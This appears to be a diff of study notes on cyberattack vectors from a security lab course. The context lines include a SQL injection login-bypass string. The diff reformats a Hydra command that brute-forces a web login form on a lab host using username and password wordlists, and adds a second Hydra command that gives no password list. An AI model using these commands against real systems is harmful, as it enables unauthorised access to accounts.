@@ -51,6 +51,10 @@ a threat vector refers to the method or means by which a cyber threat or attack 
 'OR'1'='1';--
 meow
 
-hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
-      -P /root/Desktop/wordlists/100-common-passwords.txt \
-      target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+	hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+	-P /root/Desktop/wordlists/100-common-passwords.txt \
+	target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+      
+
+	hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+	target2.ine.local http-post-form "/login:username=^USER^:F=incorrect"
